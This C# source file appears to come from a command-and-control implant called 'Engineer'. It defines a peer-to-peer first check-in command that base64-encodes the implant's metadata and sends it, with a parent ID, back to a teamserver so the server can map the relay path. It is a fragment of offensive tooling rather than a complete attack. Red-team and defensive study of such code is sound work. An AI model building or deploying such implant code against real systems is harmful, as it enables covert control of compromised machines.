using System;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class FirstCheckIn : EngineerCommand
    {
        public static bool firstCheckInDone = false; 
        public override string Name => "P2PFirstTimeCheckIn";

        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/parentid", out string parentId);
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(Convert.ToBase64String(Program._metadata.JsonSerialize()) +"\n" + parentId,task,EngTaskStatus.Complete,TaskResponseType.String); //gives back the engineers metadata and the parent so the teamserver can make the path
        }
    }
}
